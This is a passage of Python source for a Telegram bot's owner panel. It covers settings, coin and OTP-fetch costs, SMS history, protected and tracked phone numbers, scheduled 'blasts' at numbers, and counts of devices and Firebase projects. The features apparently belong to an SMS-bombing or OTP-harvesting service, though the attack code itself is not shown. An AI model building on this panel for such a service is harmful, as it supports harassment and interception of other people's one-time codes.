        await cq.answer()
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_VIDEO, '📹')} <b>Videos</b>\n\n"
        f"Total: <b>{len(d.get('videos', []))}</b>",
        videos_menu_kb(d),
    )

@R.callback_query(F.data == "owner:videos:add")
async def vids_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.add_video)
    await safe_edit(
        cq,
        f"{em(EMOJI_VIDEO, '📹')} <b>Add Video</b>\n\n"
        f"Send video, video file, or URL:",
        kb([(sc("cancel"), "owner:videos:menu")]),
    )

@R.message(S.add_video)
async def vids_add_done(m: Message, state: FSMContext):
    d = load()
    if not is_admin(m.from_user.id, d):
        await state.clear()
        return
    vid = None
    if m.video:
        vid = m.video.file_id
    elif m.document and m.document.mime_type and m.document.mime_type.startswith("video"):
        vid = m.document.file_id
    elif m.text:
        vid = m.text.strip()
    if not vid:
        await m.answer(f"❌ Valid video or URL required.", parse_mode="HTML")
        return
    d.setdefault("videos", []).append(vid)
    save()
    await state.clear()
    await m.answer(
        f"✅ Saved!",
        reply_markup=videos_menu_kb(load()),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def vids_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        idx = int(cq.data.split("owner:videos:del:", 1)[1])
    except Exception:
        try:
            await cq.answer("❌")
        except Exception:
            pass
        return
    vids = d.get("videos", [])
    if 0 <= idx < len(vids):
        vids.pop(idx)
        d["videos"] = vids
        save()
        try:
            await cq.answer("🗑 Removed!")
        except Exception:
            pass
    await vids_menu(cq, state)

@R.callback_query(F.data == "owner:videos:bulk_del")
async def vids_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    d["videos"] = []
    save()
    try:
        await cq.answer("🗑 All deleted!", show_alert=True)
    except Exception:
        pass
    await vids_menu(cq, state)

@R.callback_query(F.data == "user:random_video")
async def user_vid(cq: CallbackQuery, state: FSMContext):
    d = load()
    vids = d.get("videos", [])
    if not vids:
        try:
            await cq.answer("❌ No videos!", show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer("📹 Sending...")
    except Exception:
        pass
    await cq.answer("Video sending is unavailable: send_video() is not implemented.", show_alert=True)

# ============================================================
#  SETTINGS
# ============================================================
@R.callback_query(F.data == "owner:settings")
async def settings_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    s = d.get("settings", {})
    od = get_owner_display(d) or "<i>(hidden)</i>"
    txt = (
        f"{em(EMOJI_GEAR, '⚙️')} <b>Settings</b>\n\n"
        f"👤 Owner: <b>{od}</b>\n"
        f"🎁 Ref Credits: <b>{s.get('ref_credits', 3)}</b>\n"
        f"🪙 Ref Coins: <b>{s.get('ref_coins', 1)}</b>\n"
        f"🔐 OTP Cost: <b>{s.get('otp_cost', 1)}</b> coins\n"
        f"⏱ OTP Fresh: <b>{s.get('otp_fresh_window', 900) // 60} min</b>\n"
        f"🎁 Daily Bonus: <b>{s.get('daily_bonus_coins', 2)} coins</b>"
    )
    rows = [
        [btn("edit owner name", "owner:edit_name", EMOJI_CROWN, "✏️", style="primary")],
        [btn("referral credits", "owner:settings:ref", EMOJI_GIFT, "🎁"),
         btn("referral coins", "owner:settings:refcoin", EMOJI_COIN, "🪙")],
        [btn("otp cost", "owner:settings:otpcost", EMOJI_OTP, "🔐"),
         btn("otp fresh window", "owner:settings:otpfresh", EMOJI_CLOCK, "⏱")],
        [btn("daily bonus", "owner:settings:bonus", EMOJI_GIFT, "🎁")],
        [btn("maintenance msg", "owner:settings:maintmsg", EMOJI_BELL, "📢")],
        [btn("back", "owner:home", EMOJI_GEAR, "🔙")],
    ]
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data == "owner:settings:ref")
async def settings_ref(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.set_ref_credits)
    await safe_edit(
        cq,
        f"{em(EMOJI_GIFT, '🎁')} <b>Referral Credits</b>\n\nAmount:",
        kb([(sc("cancel"), "owner:settings")]),
    )

@R.message(S.set_ref_credits)
async def settings_ref_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        c = int((m.text or "").strip())
        if c < 0:
            raise ValueError
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    d.setdefault("settings", {})["ref_credits"] = c
    save()
    await state.clear()
    await m.answer(
        f"✅ Ref credits: {c}",
        reply_markup=kb([(sc("back"), "owner:settings")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:settings:refcoin")
async def settings_refcoin(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.set_ref_coins)
    await safe_edit(
        cq,
        f"{em(EMOJI_COIN, '🪙')} <b>Referral Coins</b>\n\nAmount:",
        kb([(sc("cancel"), "owner:settings")]),
    )

@R.message(S.set_ref_coins)
async def settings_refcoin_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        c = int((m.text or "").strip())
        if c < 0:
            raise ValueError
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    d.setdefault("settings", {})["ref_coins"] = c
    save()
    await state.clear()
    await m.answer(
        f"✅ Ref coins: {c}",
        reply_markup=kb([(sc("back"), "owner:settings")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:settings:otpcost")
async def settings_otpcost(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.set_otp_cost)
    await safe_edit(
        cq,
        f"{em(EMOJI_OTP, '🔐')} <b>OTP Cost</b>\n\nCoins per fetch:",
        kb([(sc("cancel"), "owner:settings")]),
    )

@R.message(S.set_otp_cost)
async def settings_otpcost_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        c = int((m.text or "").strip())
        if c < 0:
            raise ValueError
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    d.setdefault("settings", {})["otp_cost"] = c
    save()
    await state.clear()
    await m.answer(
        f"✅ OTP cost: {c} coins",
        reply_markup=kb([(sc("back"), "owner:settings")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:settings:otpfresh")
async def settings_otpfresh(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.set_otp_fresh)
    await safe_edit(
        cq,
        f"{em(EMOJI_CLOCK, '⏱')} <b>OTP Fresh Window</b>\n\n"
        f"Minutes (default 15):",
        kb([(sc("cancel"), "owner:settings")]),
    )

@R.message(S.set_otp_fresh)
async def settings_otpfresh_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        mins = int((m.text or "").strip())
        if mins < 1 or mins > 1440:
            raise ValueError
    except Exception:
        await m.answer(f"❌ 1-1440 minutes.", parse_mode="HTML")
        return
    d.setdefault("settings", {})["otp_fresh_window"] = mins * 60
    save()
    await state.clear()
    await m.answer(
        f"✅ Fresh window: {mins} min",
        reply_markup=kb([(sc("back"), "owner:settings")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:settings:bonus")
async def settings_bonus(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.set_daily_bonus)
    await safe_edit(
        cq,
        f"{em(EMOJI_GIFT, '🎁')} <b>Daily Bonus</b>\n\nCoins per daily claim:",
        kb([(sc("cancel"), "owner:settings")]),
    )

@R.message(S.set_daily_bonus)
async def settings_bonus_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        c = int((m.text or "").strip())
        if c < 0:
            raise ValueError
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    d.setdefault("settings", {})["daily_bonus_coins"] = c
    save()
    await state.clear()
    await m.answer(
        f"✅ Daily bonus: {c} coins",
        reply_markup=kb([(sc("back"), "owner:settings")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:settings:maintmsg")
async def settings_maintmsg(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.set_maint_msg)
    cur = d.get("settings", {}).get("maintenance_msg", "")
    await safe_edit(
        cq,
        f"{em(EMOJI_BELL, '📢')} <b>Maintenance Message</b>\n\n"
        f"Current: <i>{esc(cur[:100])}</i>\n\n"
        f"Send new message:",
        kb([(sc("cancel"), "owner:settings")]),
    )

@R.message(S.set_maint_msg)
async def settings_maintmsg_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    txt = (m.text or "").strip()[:300]
    if not txt:
        await m.answer(f"❌ Empty.", parse_mode="HTML")
        return
    d.setdefault("settings", {})["maintenance_msg"] = txt
    save()
    await state.clear()
    await m.answer(
        f"✅ Saved!",
        reply_markup=kb([(sc("back"), "owner:settings")]),
        parse_mode="HTML",
    )

# ============================================================
#  COIN LEDGER (owner)
# ============================================================
@R.callback_query(F.data == "owner:coin_ledger")
async def owner_coin_ledger(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    users = d.get("users", {})
    total_coins = sum(int(u.get("coins", 0)) for u in users.values())
    total_credits = sum(int(u.get("credits", 0)) for u in users.values())
    otp_total = sum(len(v) for v in d.get("otp_history", {}).values())
    await safe_edit(
        cq,
        f"{em(EMOJI_COIN, '🪙')} <b>Coin Ledger</b>\n\n"
        f"💰 Total Credits: <b>{total_credits}</b>\n"
        f"🪙 Total Coins: <b>{total_coins}</b>\n"
        f"🔐 OTP Fetches: <b>{otp_total}</b>\n"
        f"🔐 Cost: <b>{get_otp_cost(d)}</b> coins/use",
        kb([(sc("back"), "owner:home")]),
    )

# ============================================================
#  ACTIVITY / AUDIT LOGS
# ============================================================
@R.callback_query(F.data == "owner:activity")
async def activity(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    ent = d.get("activity_log", [])[-25:]
    if not ent:
        txt = f"{em(EMOJI_GEAR, '📜')} <b>Activity</b>\n\nEmpty."
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Recent Activity</b>\n"]
        for e in reversed(ent):
            ts = fmt_time(e.get("timestamp", 0))
            lines.append(
                f"[{ts}] <code>{e.get('uid', 0)}</code> "
                f"{e.get('action', '?')} — {esc(str(e.get('details', ''))[:60])}"
            )
        txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([
        (sc("refresh"), "owner:activity"),
        (sc("back"), "owner:home"),
    ]))

@R.callback_query(F.data == "owner:audit")
async def audit(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    ent = d.get("audit_log", [])[-30:]
    if not ent:
        txt = f"{em(EMOJI_LOCK, '🔐')} <b>Audit Log</b>\n\nEmpty."
    else:
        lines = [f"{em(EMOJI_LOCK, '🔐')} <b>Audit Log</b>\n"]
        for e in reversed(ent):
            ts = fmt_time(e.get("timestamp", 0))
            lines.append(
                f"[{ts}] <code>{e.get('uid', 0)}</code> "
                f"{e.get('action', '?')} — {esc(str(e.get('details', ''))[:60])}"
            )
        txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([
        (sc("refresh"), "owner:audit"),
        (sc("back"), "owner:home"),
    ]))

# ============================================================
#  SMS / OTP HISTORY (owner)
# ============================================================
@R.callback_query(F.data == "owner:sms_history")
async def sms_hist(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    allh = d.get("sms_history", {})
    tot = sum(len(v) for v in allh.values())
    await safe_edit(
        cq,
        f"{em(EMOJI_STAR, '📋')} <b>Global SMS History</b>\n\n"
        f"Total: <b>{tot}</b>\n"
        f"Users with history: <b>{len(allh)}</b>",
        kb([(sc("back"), "owner:home")]),
    )

@R.callback_query(F.data == "owner:otp_history")
async def otp_hist_owner(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    allh = d.get("otp_history", {})
    tot = sum(len(v) for v in allh.values())
    await safe_edit(
        cq,
        f"{em(EMOJI_OTP, '🔐')} <b>Global OTP History</b>\n\n"
        f"Total: <b>{tot}</b>\n"
        f"Users with history: <b>{len(allh)}</b>",
        kb([(sc("back"), "owner:home")]),
    )

# ============================================================
#  PROTECTED NUMBERS
# ============================================================
@R.callback_query(F.data == "owner:protect")
async def protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.protect_number)
    await safe_edit(
        cq,
        f"{em(EMOJI_LOCK, '🔒')} <b>Protect Number</b>\n\n"
        f"Send number to protect:",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.protect_number)
async def protect_done(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    num = (m.text or "").strip()
    cl = num.replace("+", "").replace(" ", "").replace("-", "")
    if not cl.isdigit() or len(cl) < 7:
        await m.answer(f"❌ Invalid number.", parse_mode="HTML")
        return
    PROTECTED_NUMBERS[num] = uid
    d["protected_numbers"] = PROTECTED_NUMBERS
    save()
    await state.clear()
    await m.answer(
        f"{em(EMOJI_LOCK, '🔒')} Protected: <code>{esc(num)}</code>",
        reply_markup=kb([(sc("back"), "owner:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:protected_list")
async def protected_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_admin(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    pr = d.get("protected_numbers", {})
    if not pr:
        await safe_edit(
            cq,
            f"{em(EMOJI_LOCK, '🔐')} <b>Protected</b>\n\n❌ None.",
            kb([(sc("back"), "owner:home")]),
        )
        return
    lines = [f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers</b>\n"]
    for num, pu in pr.items():
        lines.append(f"📞 <code>{esc(num)}</code> — <code>{pu}</code>")
    await safe_edit(cq, "\n".join(lines), kb([(sc("back"), "owner:home")]))

# ============================================================
#  TRACK NUMBER
# ============================================================
@R.callback_query(F.data == "owner:track")
async def track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.track_number)
    await safe_edit(
        cq,
        f"{em(EMOJI_STAR, '📊')} <b>Track Number</b>\n\nSend number:",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.track_number)
async def track_done(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    num = (m.text or "").strip()
    await state.clear()
    hist = d.get("sms_history", {})
    who = []
    for us, hl in hist.items():
        for e in hl:
            if e.get("number") == num:
                ud = d.get("users", {}).get(us, {})
                who.append({
                    "uid": int(us),
                    "name": ud.get("name", "?"),
                    "ts": e.get("timestamp", 0),
                })
                break
    if not who:
        await m.answer(
            f"{em(EMOJI_STAR, '📊')} Track\n\n<code>{esc(num)}</code>\n\n❌ No records.",
            reply_markup=kb([(sc("back"), "owner:home")]),
            parse_mode="HTML",
        )
        return
    lines = [f"{em(EMOJI_STAR, '📊')} <b>{esc(num)}</b>\n"]
    for e in who[:50]:
        lines.append(f"• <code>{e['uid']}</code> — {esc(str(e['name'])[:20])} — {fmt_time(e['ts'])}")
    if len(who) > 50:
        lines.append(f"<i>+{len(who) - 50} more</i>")
    await m.answer(
        "\n".join(lines),
        reply_markup=kb([(sc("back"), "owner:home")]),
        parse_mode="HTML",
    )

# ============================================================
#  EXPORT SCRIPT
# ============================================================
@R.callback_query(F.data == "owner:export_script")
async def export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer("📤...")
    except Exception:
        pass
    try:
        sp = os.path.abspath(__file__)
        await cq.message.reply_document(
            document=FSInputFile(sp),
            caption=f"📤 <b>{_VERSION}</b>",
            parse_mode="HTML",
        )
    except Exception:
        pass

# ============================================================
#  GITHUB SYNC / RESTORE
# ============================================================
@R.callback_query(F.data == "owner:gh:sync")
async def gh_sync_cmd(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    if not GITHUB_ENABLED:
        try:
            await cq.answer("❌ GitHub not configured!", show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer("📤 Pushing...")
    except Exception:
        pass
    try:
        await _github_push(d)
        await cq.message.answer("✅ Pushed to GitHub!", parse_mode="HTML")
    except Exception as e:
        try:
            await cq.message.answer(f"❌ Push failed: {esc(str(e)[:100])}", parse_mode="HTML")
        except Exception:
            pass

@R.callback_query(F.data == "owner:gh:restore")
async def gh_restore_cmd(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    if not GITHUB_ENABLED:
        try:
            await cq.answer("❌ GitHub not configured!", show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer("📥 Pulling...")
    except Exception:
        pass
    try:
        data = await _github_pull()
        if not data:
            await cq.message.answer("❌ No data on GitHub.", parse_mode="HTML")
            return
        global _DATA_CACHE, PROTECTED_NUMBERS
        _merge(data, _default_data())
        PROTECTED_NUMBERS = data.get("protected_numbers", {}) or {}
        with open(_DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        _DATA_CACHE = data
        await cq.message.answer("✅ Data restored from GitHub!", parse_mode="HTML")
    except Exception as e:
        try:
            await cq.message.answer(f"❌ Restore failed: {esc(str(e)[:100])}", parse_mode="HTML")
        except Exception:
            pass

# ============================================================
#  TEMPLATES (owner)
# ============================================================
@R.callback_query(F.data == "owner:templates:menu")
async def owner_templates_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    tpls = d.get("templates", {})
    total = sum(len(v) for v in tpls.values())
    await safe_edit(
        cq,
        f"{em(EMOJI_FILE, '📝')} <b>Templates (Global)</b>\n\n"
        f"Total: <b>{total}</b>\n"
        f"Users with templates: <b>{len(tpls)}</b>",
        kb([(sc("back"), "owner:home")]),
    )

# ============================================================
#  SCHEDULED (owner)
# ============================================================
@R.callback_query(F.data == "owner:scheduled:menu")
async def owner_scheduled_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    scheds = d.get("scheduled", [])
    lines = [f"{em(EMOJI_CLOCK, '⏰')} <b>Scheduled Blasts</b>\n\nTotal: <b>{len(scheds)}</b>\n"]
    rows = []
    for i, s in enumerate(scheds[:15]):
        when = fmt_time(s.get("when", 0))
        num = mask_number(s.get("number", "?"))
        lines.append(f"{i+1}. {when} → <code>{esc(num)}</code>")
        rows.append([btn(f"cancel #{i+1}", f"owner:sched:del:{i}", EMOJI_CROSS, "🗑")])
    rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
    await safe_edit(
        cq,
        "\n".join(lines),
        InlineKeyboardMarkup(inline_keyboard=rows),
    )

@R.callback_query(F.data.startswith("owner:sched:del:"))
async def owner_sched_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        i = int(cq.data.split(":")[-1])
    except Exception:
        try:
            await cq.answer("❌")
        except Exception:
            pass
        return
    scheds = d.get("scheduled", [])
    if 0 <= i < len(scheds):
        scheds.pop(i)
        d["scheduled"] = scheds
        save()
        try:
            await cq.answer("🗑 Cancelled")
        except Exception:
            pass
    await owner_scheduled_menu(cq, state)

# ============================================================
#  TICKETS (owner)
# ============================================================
@R.callback_query(F.data == "owner:tickets:menu")
async def owner_tickets_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    tickets = d.get("tickets", [])
    open_t = [t for t in tickets if t.get("status") == "open"]
    txt = f"{em(EMOJI_BELL, '📩')} <b>Support Tickets</b>\n\n"
    txt += f"Total: <b>{len(tickets)}</b> | Open: <b>{len(open_t)}</b>\n\n"
    for t in open_t[-8:]:
        ts = fmt_time(t.get("ts", 0))
        uid = t.get("uid", "?")
        body = esc(t.get("text", "")[:100])
        txt += f"<code>{uid}</code> [{ts}]\n   {body}\n\n"
    if not open_t:
        txt += "<i>No open tickets.</i>"
    txt = txt[:3990]
    await safe_edit(cq, txt, kb([(sc("back"), "owner:home")]))

# ============================================================
#  APPEALS (owner)
# ============================================================
@R.callback_query(F.data == "owner:appeals:menu")
async def owner_appeals_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    appeals = d.get("appeals", [])
    open_a = [a for a in appeals if a.get("status") == "open"]
    txt = f"{em(EMOJI_USER, '🔓')} <b>Ban Appeals</b>\n\n"
    txt += f"Total: <b>{len(appeals)}</b> | Open: <b>{len(open_a)}</b>\n\n"
    rows = []
    for i, a in enumerate(open_a[-10:]):
        uid = a.get("uid", "?")
        ts = fmt_time(a.get("ts", 0))
        body = esc(a.get("text", "")[:100])
        txt += f"<code>{uid}</code> [{ts}]\n   {body}\n\n"
        rows.append([btn(f"unban {uid}", f"owner:appeals:unban:{uid}", EMOJI_CHECK, "✅")])
    if not open_a:
        txt += "<i>No open appeals.</i>"
    rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
    txt = txt[:3990]
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data.startswith("owner:appeals:unban:"))
async def owner_appeals_unban(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    target = int(cq.data.split(":")[-1])
    if target in d.get("banned", []):
        d["banned"].remove(target)
    d.get("ban_reasons", {}).pop(str(target), None)
    # mark appeal resolved
    for a in d.get("appeals", []):
        if a.get("uid") == target:
            a["status"] = "resolved"
    save()
    try:
        await cq.answer("✅ Unbanned!")
    except Exception:
        pass
    try:
        await cq.bot.send_message(target, f"✅ Appeal accepted. You are unbanned.", parse_mode="HTML")
    except Exception:
        pass
    await owner_appeals_menu(cq, state)

# ============================================================
#  ANNOUNCEMENTS
# ============================================================
@R.callback_query(F.data == "owner:announce:menu")
async def owner_announce_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    ann = d.get("announcements", [])
    txt = f"{em(EMOJI_BELL, '📣')} <b>Announcements</b>\n\nTotal: <b>{len(ann)}</b>\n\n"
    for a in ann[-5:]:
        ts = fmt_time(a.get("ts", 0))
        txt += f"[{ts}] {esc(a.get('text', '')[:80])}\n\n"
    rows = [
        [btn("new", "owner:announce:new", EMOJI_PLUS, "➕")],
        [btn("clear all", "owner:announce:clear", EMOJI_CROSS, "🗑")],
        [btn("back", "owner:home", EMOJI_GEAR, "🔙")],
    ]
    txt = txt[:3990]
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data == "owner:announce:new")
async def owner_announce_new(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.broadcast)
    await state.update_data(announcement=True)
    await safe_edit(
        cq,
        f"{em(EMOJI_BELL, '📣')} <b>New Announcement</b>\n\nSend message:",
        kb([(sc("cancel"), "owner:announce:menu")]),
    )

@R.callback_query(F.data == "owner:announce:clear")
async def owner_announce_clear(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    d["announcements"] = []
    save()
    try:
        await cq.answer("🗑 Cleared")
    except Exception:
        pass
    await owner_announce_menu(cq, state)

# ============================================================
#  USER GROUPS
# ============================================================
@R.callback_query(F.data == "owner:groups:menu")
async def owner_groups_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    groups = d.get("user_groups", {})
    txt = f"{em(EMOJI_USER, '👥')} <b>User Groups</b>\n\n"
    if not groups:
        txt += "<i>No groups defined yet.</i>\n\n"
        txt += "Coming soon: bulk add/deduct by group."
    else:
        for name, users in groups.items():
            txt += f"• <b>{esc(name)}</b> — {len(users)} users\n"
    txt = txt[:3990]
    await safe_edit(cq, txt, kb([(sc("back"), "owner:home")]))

# ═══════════════════════════════════════════════════════════
#  END OF PART 5  —  paste PART 6 right after this line
# ═══════════════════════════════════════════════════════════
# ============================================================
#  PART 6 START — COMMANDS / SESSION / SHUTDOWN / ENTRY
# ============================================================

# ============================================================
#  SLASH COMMANDS
# ============================================================
@R.message(Command("ping"))
async def cmd_ping(m: Message, state: FSMContext):
    uptime = int(time.time() - _START_TIME)
    await m.answer(
        f"🏓 <b>Pong!</b>\n\n"
        f"⏱ Uptime: <b>{fmt_duration(uptime)}</b>\n"
        f"📱 Devices: <b>{LAST_KNOWN_DEVICE_COUNT}</b>\n"
        f"🔥 Firebases: <b>{len(load().get('firebases', []))}</b>\n"
        f"⚡ Power: <b>{CURRENT_POWER_MODE}x</b>",
        parse_mode="HTML",
    )

@R.message(Command("backup"))
async def cmd_backup(m: Message, state: FSMContext):
    await state.clear()
    uid = m.from_user.id
    d = load()
    if not is_owner(uid, d):
        await m.answer(f"❌ Owner only!", parse_mode="HTML")
        return
    wait = None
    try:
        wait = await m.answer("📦 Creating backup...", parse_mode="HTML")
    except Exception:
        pass
    # local copy to log channel
    try:
        if os.path.exists(_DATA_FILE):
            await m.bot.send_document(
                chat_id=LOG_CHANNEL_ID,
                document=FSInputFile(_DATA_FILE),
                caption=f"📦 <b>Manual Backup</b>\n\n"
                        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode="HTML",
            )
    except Exception:
        pass
    # github push
    gh_ok = False
    if GITHUB_ENABLED:
        try:
            await _github_push(d)
            gh_ok = True
        except Exception:
            gh_ok = False
    if wait:
        try:
            await wait.delete()
        except Exception:
            pass
    await m.answer(
        f"✅ <b>Backup done</b>\n\n"
        f"📁 Local: ✅\n"
        f"📤 Log channel: ✅\n"
        f"🐙 GitHub: {'✅' if gh_ok else '❌'}",
        parse_mode="HTML",
    )

@R.message(Command("restore"))
async def cmd_restore(m: Message, state: FSMContext):
    await state.clear()
    uid = m.from_user.id
    d = load()
    if not is_owner(uid, d):
        await m.answer(f"❌ Owner only!", parse_mode="HTML")
        return
    if not GITHUB_ENABLED:
